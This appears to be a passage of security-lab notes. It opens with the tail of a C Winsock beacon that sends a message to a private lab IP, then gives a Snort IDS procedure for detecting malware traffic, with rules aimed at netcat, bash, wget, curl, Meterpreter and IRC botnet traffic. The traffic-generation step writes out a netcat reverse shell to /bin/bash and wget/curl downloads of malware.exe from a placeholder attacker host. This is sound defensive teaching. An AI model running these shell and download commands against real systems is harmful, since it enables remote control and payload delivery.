#include <windows.h>

    WSADATA w;
    SOCKET s;
    struct sockaddr_in server;
    char msg[] = "beacon:system_online";

    WSAStartup(MAKEWORD(2,2), &w);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr("192.168.56.101");

    connect(s, (struct sockaddr*)&server, sizeof(server));
    send(s, msg, sizeof(msg), 0);

    closesocket(s);
    WSACleanup();
    return 0;
}

✅ EXPERIMENT 6 – Malware Detection using Snort IDS
📄 (Ref: )
Procedure
Step 1: Network Setup
1. Set all VMs to Host-only network.
2. Check IP addresses:  ifconfig            
3. Verify connectivity:  ping <kali_ip>            

Step 2: Install Snort (Ubuntu)
1. Install Snort:  sudo apt update
2. sudo apt install snort -y            
3. Check version:  snort -V            

Step 3: Configure Snort
1. Open config file:  sudo nano /etc/snort/snort.conf            
2. Set HOME_NET:  ipvar HOME_NET 192.168.45.0/24            

Step 4: Add Detection Rules
1. Edit rules file:  sudo nano /etc/snort/rules/local.rules            
2. Add malware detection rules (given below).

Step 5: Test Configuration
1. Validate:

sudo snort -T -c /etc/snort/snort.conf


Step 6: Run Snort
1. Find interface:

ip link

1. Start IDS:

sudo snort -A console -q -c /etc/snort/snort.conf -i <interface>


Step 7: Generate Traffic (Kali / Metasploitable)
1. Reverse shell test:

nc -lvnp 4444
nc <kali_ip> 4444 -e /bin/bash

1. Other tests:

echo "nc test" | nc <kali_ip> 1234
echo "/bin/bash" | nc <kali_ip> 1234
wget http://<kali_ip>/malware.exe
curl http://<kali_ip>/malware.exe


Step 8: View Alerts
1. Check logs:

sudo cat /var/log/snort/alert

1. Monitor live:

sudo tail -f /var/log/snort/alert


Code (Snort Rules)

alert tcp any any -> $HOME_NET 4444 (msg:"Reverse Shell Detected"; sid:1000001;)

alert tcp any any -> $HOME_NET any (msg:"Netcat Detected"; content:"nc "; nocase; sid:1000002;)

alert tcp any any -> $HOME_NET any (msg:"Bash Execution"; content:"/bin/bash"; nocase; sid:1000003;)

alert tcp any any -> $HOME_NET any (msg:"Wget Download"; content:"wget"; nocase; sid:1000004;)

alert tcp any any -> $HOME_NET any (msg:"Curl Download"; content:"curl"; nocase; sid:1000005;)

alert tcp any any -> $HOME_NET 80 (msg:"EXE Download"; content:".exe"; sid:1000006;)

alert tcp any any -> $HOME_NET any (msg:"Meterpreter Detected"; content:"meterpreter"; nocase; sid:1000007;)

alert tcp any any -> $HOME_NET 6667 (msg:"IRC Botnet Traffic"; sid:1000008;)
